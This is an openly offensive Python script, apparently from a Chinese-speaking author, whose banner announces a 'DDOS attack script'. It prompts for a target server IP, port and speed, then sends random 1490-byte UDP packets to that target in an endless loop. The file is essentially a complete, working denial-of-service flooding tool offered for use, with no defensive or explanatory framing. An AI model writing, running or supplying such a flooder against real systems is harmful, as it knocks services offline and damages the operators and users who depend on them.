import socket
import time
import random
import threading
import sys
import os
#code time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
#attact
print("如果显示有问题，请将终端全屏之后再打开该脚本")
print(" _____________________________________________________________________________________ ")
print("╱                                                                                     ╲")
print('''|     _ \        __ \  __ \               ___|           _)       |                    |
|    |   | |   | |   | |   |  _ \   __| \___ \   __|  __| | __ \  __|                  |
|    ___/  |   | |   | |   | (   |\__ \       | (    |    | |   | |                    |
|   _|    \__, |____/ ____/ \___/ ____/ _____/ \___|_|   _| .__/ \__|                  |        
|          ____/                                            _|                         |          ''')
print("|======================================================================================|")
print("| PYTHON DDOS ACCACK SCRIPT PYTHON DDOS ACCACK SCRIPT PYTHON DDOS ACCACK SCRIPT PYTHON |")
print("| Python Dos攻击脚本 Python Dos攻击脚本 Python Dos攻击脚本 Python Dos攻击脚本 Python Do|")
print("|======================================================================================|")
print("│                      脚本作者:周XY Zhouxuanyao233                                    |")
print("│         作者github:Zhouxuanyao2333(https://github.com/Zhouxuanyao2333)               │")
print("|严禁转载-违者必究-严禁转载-违者必究-严禁转载-违者必究-严禁转载-违者必究-严禁转载-违者 |")
print("|                    原理很简单准确的说这个应该是DOS脚本awa                            |")
print("|          作者联系邮箱 Zhouxuanyao233@outlook.com wpsoffice88@qq.com                  |")
print("╲_____________________________________________________________________________________╱")
IP_address = input("请输入要攻击的服务器的IP地址:")
TPS = int(input("请输入攻击端口:"))
speed = int(input("请输入攻击速度(1-1000):"))

print("OK开始闪击")
os.system("clear")
#变量设置
sent = 0
while True:
    sock.sendto(bytes, (IP_address,TPS))
    sent = sent + 1
    print ("已攻击 %s 次到服务器的 %s 端口 %d"%(sent,IP_address,TPS))
    time.sleep((1000-speed)/2000)
